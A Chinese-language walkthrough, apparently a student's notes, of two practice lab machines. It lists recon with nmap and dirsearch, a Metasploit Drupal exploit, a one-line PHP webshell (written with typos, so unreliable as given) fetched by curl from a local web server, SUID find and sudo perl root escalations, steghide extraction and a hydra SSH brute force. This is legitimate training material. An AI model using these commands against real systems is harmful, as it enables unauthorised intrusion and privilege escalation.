靶机一

  • 先nmap -p- 192.168.2.88 先全端口扫描
  • 访问ip
  • 知道web服务后用dirsearch扫描目录dirsearch -u 192.168.2.88
  • 访问192.168.2.88/robots.txt访问爬虫文件，查找出版本信息
  • 用msfconsole进行攻击
  • search Drupal 搜索漏洞
  • use 2 使用第2种攻击方式
  • show options 设置参数
  • set rhosts 192.168.2.88设置目标
  • run 进行攻击
  • 成功后进入伪终端
  • 输入shell 创建会话
  • ls 查看文件，查看到flag1.txt文件
  • 判断是否存在curl
  • 写个马 1.php<?php @eva($_GRT[cmd]);?>
  • 用python开启一个服务，python -m http.server 80 以80端口开启一个web服务
  • curl http://192.168.2.88/1.php -o 2.php 上传木马
  • 通过flag1.txt得知需查看配置文件
  • python -c “import pty;pty.spawn(‘/bin/bash’)”利用python加强shell
  • find / -user root -perm -4000 -print 2>/dev/null 利用find命令提权，寻找特权文件
  • find / -name cron.php -exec “/bin/sh” ; 前面为搜索文件，后面执行，执行find的时候用root权限
  • whoami，提权为root
  • cd /root 进入根目录后ls查看文件，找到thefinalflag.txt

靶机二

  • 下载oracle VM，设置靶机，usb设置为1.1，网络改成仅主机
  • 启动靶机，将kali设置成桥接，并将网卡桥接到仅主机
  • ifdown eth0关闭网卡
  • ifup eth0 启动eth0网卡，重新获取ip
  • arp-scan -l-I eth0 查看该网段下的主机
  • 访问IP，找到靶机
  • nmap -sn 192.168.56.101扫描判断是否存活
  • nmap -p 1-1000 192.168.56.101 扫描端口
  • nmap -p 21,22,80 -sC 1192.168.56.101 进行测试
  • 发现FTP漏洞，Anonymous FTP login allowed 用Anoymous可以登录
  • dirsearch -u “http：//192.168.56.101” -x 401 403 404 进行目录扫描
  • 访问80端口查看页面信息
  • 扫描得知blogs目录，访问blogs目录，查看页面源代码，发现提示要求访问S3cr3t-T3xt目录，查看源代码，得知key为3xtrctd4t4
  • ftp 192.168.56.101 用anymous登录
  • help查看ftp命令
  • ls 查看到jpg文件
  • 用get将jpg下载下来
  • strings jpg 用二进制形式查看文件
  • 发现二进制文件开头异常
  • steghide extract -sf trytofind.jpg 剥离文件
  • 输入获得的key，剥离出data.txt文件
  • hydra -l renu -P /usr/share/wordlist/seclists/Passwords/500 -worst-passwords.txt ssh://192.168.56.101进行爆破
  • 爆出密码后用renu用户登录
  • ls查看得到user1.txt文件，获得flag
  • cat .bash_history查看命令的历史记录，已知登陆过lily用户
  • 用ssh lily@192.168.56.101 登录用户
  • ls查看得知user2.txt文件
  • sudo -l 得知/usr/bin/pel任意用户可执行
  • sudo perl -e ‘exec “/bin/sh”;’提权
  • cd /root
  • ls -al查看最后一个flag
